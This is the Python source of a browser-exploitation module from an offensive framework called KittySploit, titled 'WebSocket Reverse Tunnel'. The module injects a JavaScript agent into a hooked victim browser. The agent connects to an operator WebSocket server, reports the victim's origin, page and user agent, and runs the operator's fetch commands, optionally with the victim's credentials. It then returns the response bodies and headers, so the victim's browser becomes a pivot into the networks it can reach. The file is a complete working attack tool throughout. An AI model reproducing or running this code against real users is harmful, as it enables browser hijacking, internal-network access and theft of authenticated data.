from kittysploit import *
import json
import threading
import time
import queue

try:
	import asyncio
	from websockets.server import serve as ws_serve
	WEBSOCKETS_AVAILABLE = True
except ImportError:
	WEBSOCKETS_AVAILABLE = False
	ws_serve = None


class Module(BrowserAuxiliary):

	__info__ = {
		"name": "WebSocket Reverse Tunnel",
		"description": "Open a WebSocket from the hooked browser and proxy HTTP fetch commands through it",
		"author": "KittySploit Team",
		"browser": Browser.ALL,
		"platform": Platform.ALL,
		"session_type": SessionType.BROWSER,
		"dependencies": ["websockets"],
	}

	ws_url = OptString(
		"ws://127.0.0.1:9876/tunnel",
		"WebSocket URL the victim browser connects to",
		False,
	)
	start_operator = OptBool(
		True,
		"Start a local KittySploit tunnel operator on bind_host:bind_port",
		False,
	)
	bind_host = OptString("127.0.0.1", "Operator bind host", False)
	bind_port = OptInteger(9876, "Operator bind port", False)
	path = OptString("/tunnel", "Operator WebSocket path", False)
	proxy_urls = OptString(
		"",
		"Comma-separated URLs to fetch via the tunnel after connect",
		False,
	)
	duration = OptInteger(
		20,
		"Seconds to keep the tunnel agent alive in the browser",
		False,
	)
	max_body = OptInteger(65536, "Max response body bytes per proxied fetch", False)
	credentials = OptString("omit", "Fetch credentials for proxied requests", False)

	def _parse_proxy_urls(self):
		urls = []
		for part in str(self.proxy_urls or "").split(","):
			u = part.strip()
			if u and u not in urls:
				urls.append(u)
		return urls

	def _start_operator(self, host, port, path, proxy_urls, max_body, credentials, results_q, stop_event):
		async def handler(websocket, request_path=None):
			# websockets v10-12: path arg; v13+: websocket.request.path
			req_path = request_path
			if req_path is None:
				req = getattr(websocket, "request", None)
				req_path = getattr(req, "path", None) if req is not None else None
			if req_path is None:
				req_path = "/"
			# Ignore query string
			req_path = str(req_path).split("?", 1)[0]
			if path not in ("", "/") and req_path != path:
				print_warning(f"Ignoring WS client on unexpected path {req_path!r} (expected {path!r})")
				try:
					await websocket.close()
				except Exception:
					pass
				return

			peer = getattr(websocket, "remote_address", None)
			print_success(f"Tunnel client connected: {peer}")
			try:
				hello_raw = await asyncio.wait_for(websocket.recv(), timeout=15)
				hello = json.loads(hello_raw) if isinstance(hello_raw, str) else {}
				if hello.get("type") != "hello":
					print_warning(f"Unexpected first message: {hello}")
				else:
					print_info(f"  origin={hello.get('origin')} page={hello.get('page_url')}")
					results_q.put({"event": "hello", "data": hello})

				for idx, url in enumerate(proxy_urls):
					req_id = f"req-{idx}"
					cmd = {
						"type": "fetch",
						"id": req_id,
						"url": url,
						"method": "GET",
						"headers": {},
						"body": None,
						"credentials": credentials,
						"max_body": max_body,
					}
					await websocket.send(json.dumps(cmd))
					print_status(f"Proxied fetch [{req_id}] {url}")
					try:
						raw = await asyncio.wait_for(websocket.recv(), timeout=30)
						msg = json.loads(raw) if isinstance(raw, str) else {}
					except Exception as exc:
						msg = {"type": "fetch_result", "id": req_id, "ok": False, "error": str(exc)}
					results_q.put({"event": "fetch_result", "data": msg})
					self._print_fetch_result(msg)

				while not stop_event.is_set():
					try:
						await websocket.send(json.dumps({"type": "ping", "ts": time.time()}))
						raw = await asyncio.wait_for(websocket.recv(), timeout=5)
						msg = json.loads(raw) if isinstance(raw, str) else {}
						if msg.get("type") == "fetch_result":
							results_q.put({"event": "fetch_result", "data": msg})
							self._print_fetch_result(msg)
					except asyncio.TimeoutError:
						continue
					except Exception:
						break

				try:
					await websocket.send(json.dumps({"type": "close"}))
				except Exception:
					pass
			except Exception as exc:
				print_error(f"Operator handler error: {exc}")
				results_q.put({"event": "error", "data": str(exc)})

		async def main():
			async with ws_serve(handler, host, port, ping_interval=20, ping_timeout=20):
				print_status(f"Tunnel operator listening on ws://{host}:{port}{path}")
				results_q.put({"event": "listening", "data": {"host": host, "port": port, "path": path}})
				while not stop_event.is_set():
					await asyncio.sleep(0.3)

		try:
			asyncio.run(main())
		except Exception as exc:
			print_error(f"Failed to start tunnel operator: {exc}")
			results_q.put({"event": "error", "data": str(exc)})

	@staticmethod
	def _print_fetch_result(msg: dict):
		if not isinstance(msg, dict):
			return
		rid = msg.get("id", "?")
		if not msg.get("ok"):
			print_error(f"  [{rid}] FAIL: {msg.get('error')}")
			return
		print_success(f"  [{rid}] {msg.get('status')} {msg.get('url')}")
		body = msg.get("body")
		if body:
			preview = body if len(body) <= 500 else body[:500] + "..."
			print_info(f"      body: {preview.replace(chr(10), ' ')}")

	def _inject_agent(self, ws_url: str, duration_s: int, max_body: int):
		code_js = f"""
		(function() {{
			const WS_URL = {json.dumps(ws_url)};
			const DURATION_MS = {duration_s * 1000};
			const DEFAULT_MAX_BODY = {max_body};

			if (window.__ksWsTunnel && window.__ksWsTunnel.readyState <= 1) {{
				return JSON.stringify({{ ok: true, already: true, ws_url: WS_URL }});
			}}

			function truncate(text, maxLen) {{
				const s = String(text == null ? '' : text);
				if (s.length <= maxLen) return {{ value: s, truncated: false, length: s.length }};
				return {{ value: s.slice(0, maxLen), truncated: true, length: s.length }};
			}}

			function handleFetch(ws, msg) {{
				const maxBody = msg.max_body || DEFAULT_MAX_BODY;
				const init = {{
					method: (msg.method || 'GET').toUpperCase(),
					credentials: msg.credentials || 'omit',
					mode: 'cors',
					redirect: 'follow',
					cache: 'no-store'
				}};
				if (msg.headers && typeof msg.headers === 'object') init.headers = msg.headers;
				if (msg.body != null && init.method !== 'GET' && init.method !== 'HEAD') init.body = msg.body;

				const started = Date.now();
				return fetch(msg.url, init)
					.then(function(resp) {{
						const headers = {{}};
						try {{ resp.headers.forEach(function(v, k) {{ headers[k] = v; }}); }} catch (e) {{}}
						return resp.text().then(function(text) {{
							const bodyInfo = truncate(text, maxBody);
							ws.send(JSON.stringify({{
								type: 'fetch_result',
								id: msg.id,
								ok: true,
								url: msg.url,
								final_url: resp.url || msg.url,
								status: resp.status,
								status_text: resp.statusText || '',
								headers: headers,
								body: bodyInfo.value,
								body_length: bodyInfo.length,
								body_truncated: bodyInfo.truncated,
								elapsed_ms: Date.now() - started
							}}));
						}});
					}})
					.catch(function(err) {{
						ws.send(JSON.stringify({{
							type: 'fetch_result',
							id: msg.id,
							ok: false,
							url: msg.url,
							error: err.message || String(err),
							elapsed_ms: Date.now() - started
						}}));
					}});
			}}

			try {{
				const ws = new WebSocket(WS_URL);
				window.__ksWsTunnel = ws;

				ws.onopen = function() {{
					ws.send(JSON.stringify({{
						type: 'hello',
						origin: location.origin,
						page_url: location.href,
						ua: navigator.userAgent,
						ts: Date.now()
					}}));
				}};

				ws.onmessage = function(ev) {{
					let msg;
					try {{ msg = JSON.parse(ev.data); }} catch (e) {{ return; }}
					if (!msg || !msg.type) return;
					if (msg.type === 'fetch') {{
						handleFetch(ws, msg);
					}} else if (msg.type === 'ping') {{
						ws.send(JSON.stringify({{ type: 'pong', ts: Date.now() }}));
					}} else if (msg.type === 'close') {{
						try {{ ws.close(); }} catch (e) {{}}
					}}
				}};

				setTimeout(function() {{
					try {{ if (ws.readyState <= 1) ws.close(); }} catch (e) {{}}
				}}, DURATION_MS);

				return JSON.stringify({{
					ok: true,
					started: true,
					ws_url: WS_URL,
					duration_s: Math.floor(DURATION_MS / 1000),
					page_url: location.href
				}});
			}} catch (e) {{
				return JSON.stringify({{ ok: false, error: e.message || String(e) }});
			}}
		}})();
		"""
		return self.send_js_and_wait_for_response(code_js, timeout=15.0)

	def run(self):
		ws_url = str(self.ws_url or "ws://127.0.0.1:9876/tunnel").strip()
		start_op = self._to_bool(self.start_operator)
		duration = max(5, int(self.duration or 20))
		max_body = max(256, int(self.max_body or 65536))
		credentials = str(self.credentials or "omit").strip().lower()
		if credentials not in ("omit", "same-origin", "include"):
			print_error("credentials must be omit, same-origin, or include")
			return False

		proxy_urls = self._parse_proxy_urls()
		results_q: queue.Queue = queue.Queue()
		stop_event = threading.Event()
		op_thread = None

		if start_op:
			if not WEBSOCKETS_AVAILABLE:
				print_error("websockets package required for start_operator=true")
				print_info("Install: pip install websockets")
				print_info("Or set start_operator false and point ws_url at your own operator")
				return False

			host = str(self.bind_host or "127.0.0.1").strip() or "127.0.0.1"
			port = int(self.bind_port or 9876)
			path = str(self.path or "/tunnel").strip() or "/tunnel"
			if not path.startswith("/"):
				path = "/" + path

			# Align default ws_url with bind settings when still default-ish
			expected = f"ws://{host}:{port}{path}"
			if "127.0.0.1:9876" in ws_url or ws_url.endswith(":9876/tunnel"):
				ws_url = expected.replace("0.0.0.0", "127.0.0.1")

			op_thread = threading.Thread(
				target=self._start_operator,
				args=(host, port, path, proxy_urls, max_body, credentials, results_q, stop_event),
				daemon=True,
			)
			op_thread.start()

			# Wait until listening or error
			listening = False
			deadline = time.time() + 8
			while time.time() < deadline and not listening:
				try:
					ev = results_q.get(timeout=0.4)
				except queue.Empty:
					continue
				if ev.get("event") == "listening":
					listening = True
				elif ev.get("event") == "error":
					print_error(ev.get("data"))
					stop_event.set()
					return False
			if not listening:
				print_warning("Operator did not confirm listening yet — continuing inject anyway")

		print_status(f"Injecting tunnel agent -> {ws_url}")
		inject = self._inject_agent(ws_url, duration, max_body)
		if not inject:
			print_error("Failed to inject WebSocket tunnel agent")
			stop_event.set()
			return False
		if isinstance(inject, str) and inject.startswith("Error:"):
			print_error(inject)
			stop_event.set()
			return False

		try:
			info = json.loads(inject)
		except json.JSONDecodeError:
			print_error(f"Unexpected inject response: {inject}")
			stop_event.set()
			return False

		if not info.get("ok"):
			print_error(info.get("error", "inject failed"))
			stop_event.set()
			return False

		print_success(
			"Tunnel agent started"
			+ (" (already active)" if info.get("already") else "")
		)

		if not start_op:
			print_info("start_operator=false — use an external WS operator speaking the tunnel protocol:")
			print_info('  hello <- browser; fetch -> browser; fetch_result <- browser; ping/pong; close')
			print_info(f"  Agent will stay up ~{duration}s")
			return True

		if not proxy_urls:
			print_info("No proxy_urls set — waiting for hello / keepalive only")
			print_info("Set proxy_urls to exercise HTTP pivot through the tunnel")

		# Drain events until duration nearly elapsed
		end = time.time() + duration
		got_hello = False
		fetch_count = 0
		while time.time() < end:
			try:
				ev = results_q.get(timeout=0.5)
			except queue.Empty:
				continue
			if ev.get("event") == "hello":
				got_hello = True
			elif ev.get("event") == "fetch_result":
				fetch_count += 1
			elif ev.get("event") == "error":
				print_error(ev.get("data"))

		stop_event.set()
		if op_thread:
			op_thread.join(timeout=3)

		print_info("=" * 60)
		print_info("WebSocket Tunnel summary")
		print_info(f"  hello received: {got_hello}")
		print_info(f"  fetch results: {fetch_count}")
		if not got_hello:
			print_warning("No hello from browser — check ws_url reachability / mixed content (ws vs wss)")
			return False
		return True
